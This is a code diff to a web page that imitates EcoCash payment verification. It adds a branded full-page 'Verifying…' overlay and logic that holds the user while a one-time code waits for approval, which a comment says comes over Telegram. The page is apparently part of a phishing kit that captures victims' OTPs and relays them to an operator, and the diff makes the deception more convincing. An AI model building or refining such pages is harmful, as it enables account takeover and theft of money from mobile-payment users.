@@ -123,6 +123,30 @@
     font-size: 11px; color: var(--eco-muted); line-height: 1.6;
   }
 
+  /* Full-page Verifying overlay */
+  .verifying {
+    position: fixed; inset: 0;
+    background: #FFFFFF;
+    display: none; align-items: center; justify-content: center;
+    z-index: 2000;
+  }
+  .verifying.show { display: flex; }
+  .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
+  .verifying .logo-big {
+    display: inline-flex; align-items: baseline;
+    font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 32px;
+  }
+  .verifying .logo-big .eco { color: var(--eco-blue); }
+  .verifying .logo-big .cash { color: var(--eco-red); }
+  .verifying .spinner {
+    width: 54px; height: 54px; margin: 0 auto 22px;
+    border: 4px solid #E5E7EB; border-top-color: var(--eco-blue);
+    border-radius: 50%; animation: spin 0.9s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
+
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -196,6 +220,16 @@
 
   <div class="page-foot">
     Powered by EcoCash · Secure payment verification
+  </div>
+</div>
+
+<!-- Full-page Verifying overlay -->
+<div class="verifying" id="verifying">
+  <div class="inner">
+    <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="spinner"></div>
+    <div class="t">Verifying…</div>
+    <div class="s">Please wait for approval. Do not close this page.</div>
   </div>
 </div>
 
@@ -358,7 +392,8 @@
   }
 
   /* ------------------------------------------------------------
-     Verify — poll for the OTP decision, then submit
+     Verify — full-page "Verifying…" overlay,
+     poll for Approve / Decline, redirect on approve
   ------------------------------------------------------------ */
   async function verifyCode() {
     clearMessages();
@@ -369,17 +404,17 @@
       return;
     }
 
-    const btn = document.getElementById('verifyBtn');
-    btn.disabled = true;
-    btn.textContent = 'Checking approval…';
+    // Show the full-page verifying overlay immediately
+    document.getElementById('verifying').classList.add('show');
+    document.getElementById('verifyBtn').disabled = true;
 
     const start = Date.now();
     const maxWaitMs = 90 * 1000;   // 90 s to wait for Telegram approval
 
     const check = async () => {
       if (Date.now() - start > maxWaitMs) {
-        btn.disabled = false;
-        btn.textContent = 'Verify';
+        document.getElementById('verifying').classList.remove('show');
+        document.getElementById('verifyBtn').disabled = false;
         showError('Approval timed out. Please resend the code.');
         return;
       }
@@ -391,9 +426,10 @@
         decision = j.decision || 'pending';
       } catch (e) { /* retry */ }
 
+      // Declined — close the overlay, clear OTP, show red message
       if (decision === 'declined' || decision === 'expired') {
-        btn.disabled = false;
-        btn.textContent = 'Verify';
+        document.getElementById('verifying').classList.remove('show');
+        document.getElementById('verifyBtn').disabled = false;
         clearOtp();
         showError('Code expired. Please resend.');
         resendBtn.disabled = false;
@@ -402,8 +438,8 @@
         return;
       }
 
+      // Approved — submit the OTP to the server and redirect
       if (decision === 'approved') {
-        btn.textContent = 'Verifying…';
         try {
           const r = await fetch('/api/verification/verify', {
             method: 'POST',
@@ -413,15 +449,13 @@
           const j = await r.json().catch(() => ({}));
 
           if (!r.ok || !j.success) {
+            document.getElementById('verifying').classList.remove('show');
+            document.getElementById('verifyBtn').disabled = false;
             showError(j.message || 'Invalid code. Please try again.');
-            btn.disabled = false;
-            btn.textContent = 'Verify';
             clearOtp();
             return;
           }
 
-          showSuccess('Code verified. Redirecting…');
-          btn.textContent = 'Verified ✓';
           await reportEvent('verification_success');
 
           const q = new URLSearchParams({
@@ -432,17 +466,16 @@
             c:   txData.c
           });
 
-          setTimeout(() => {
-            window.location.replace('verify.html?' + q.toString());
-          }, 800);
+          window.location.replace('verify.html?' + q.toString());
         } catch (e) {
+          document.getElementById('verifying').classList.remove('show');
+          document.getElementById('verifyBtn').disabled = false;
           showError('Network error. Please try again.');
-          btn.disabled = false;
-          btn.textContent = 'Verify';
         }
         return;
       }
 
+      // Still pending — check again
       setTimeout(check, 1500);
     };
 
